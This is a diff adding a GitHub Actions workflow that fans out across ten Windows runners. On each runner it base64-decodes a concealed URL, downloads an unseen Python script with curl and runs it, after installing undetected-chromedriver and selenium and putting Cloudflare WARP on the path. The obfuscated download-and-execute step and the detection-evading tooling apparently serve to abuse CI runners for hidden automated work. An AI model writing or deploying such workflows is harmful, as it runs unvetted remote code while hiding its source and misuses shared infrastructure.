@@ -1,0 +1,70 @@
+name: Task Dispatcher Cluster
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  launch-workers:
+    name: "Runner-Node-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Prepare Environment & Dependencies
+        shell: bash
+        run: |
+          echo "[STAGE-1] Initializing Runner Node ${{ matrix.node_index }}..."
+          
+          # استخراج الرابط الهدف وتنزيل النواة البرمجية
+          PAYLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$PAYLOAD_URL" -o app_task.py
+          
+          echo "[STAGE-1] Updating package manager and installing modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[STAGE-1] Environment setup finalized."
+
+      - name: Execute Core Process with Supervision
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "==> Starting execution thread on node ${{ matrix.node_index }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessConfig = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $JobProcess = Start-Process @ProcessConfig
+          
+          Write-Output "==> Monitor active. Timeout threshold set to 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $JobProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output "==> Process finished successfully within allotted time."
+          }
+          catch {
+              Write-Output "==> Time limit reached! Aborting process..."
+              Stop-Process -InputObject $JobProcess -Force
+              Write-Output "==> Process forcefully terminated."
+          }
+
+      - name: Finalize Execution
+        shell: bash
+        run: echo "[STATUS] Runner-Node-${{ matrix.node_index }} completed cycle."
